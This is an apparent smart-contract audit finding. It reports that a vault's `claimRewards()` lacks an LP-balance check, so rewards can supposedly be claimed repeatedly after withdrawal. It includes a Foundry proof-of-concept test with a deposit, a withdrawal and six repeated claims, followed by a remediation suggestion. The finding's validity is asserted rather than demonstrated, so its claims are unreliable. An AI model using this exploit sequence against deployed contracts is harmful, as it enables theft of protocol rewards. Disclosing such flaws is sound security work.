# VaultOwner can keep claiming free rewards after withdrawal

## Summary

Users are able to supply wsteth tokens to the vault using the `deposit()` function and withdraw from from the vault while also claiming rewards by setting the `claim` flag to true. When a user withdraws with a `true` claim flag, they should be able to completely withdraw from the vault however, there lacks a check of LP when attempting to claim rewards. 

## Vulnerability Detail

The code for `claimRewards()` looks like the following:

```solidity
function claimRewards() external override onlyWhileActive onlyOwner nonReentrant {
    // Claim rewards from Aura
    auraRewardPool().getReward(owner(), true);
    // Send rewards to owner
    _sendRewards();
}
```

Because there is no validation of the LP status of the vault owner, when calling `claimRewards()`, users may be able to claim free rewards after withdrawing from the protocol. The proof of concept below outlines this scenario:

```solidity
function testClaimRewardsAfterWithdrawal() public {

    // Setup scenario 
    ERC20 balReward = ERC20(address(aliceVault.bal()));

    vm.startPrank(address(alice));
    wsteth.approve(address(aliceVault), wsteth.balanceOf(address(alice)));
    aliceVault.deposit(100 ether, 0);

    uint256[] memory minTokenAmounts = new uint256[](1);
    minTokenAmounts[0] = 0;

    aliceVault.withdraw(100 ether, minTokenAmounts, true);

    aliceVault.claimRewards();
    aliceVault.claimRewards();
    aliceVault.claimRewards();
    aliceVault.claimRewards();
    aliceVault.claimRewards();
    aliceVault.claimRewards();
    vm.stopPrank();

    assertEq(aliceVault.getLpBalance(), 0);
    assertEq(balReward.balanceOf(address(alice)), 7 ether);

}
```

## Impact

This effectively results in the theft of reward tokens.

## Tool used

Manual Review

## Recommendation

It’s recommended that the vault checks that the user is still invested in the protocol and hasn’t claimed their rewards yet. This can by done by setting a state variable `claimed` which is for example `false` on deposit and `true` on withdrawal if the `claim` flag is set to true. This `claimed` state variable can be validated when the user attempts to claim rewards. This essentially locks the ability to call the `claimRewards()` function if the user hasn’t deposited.
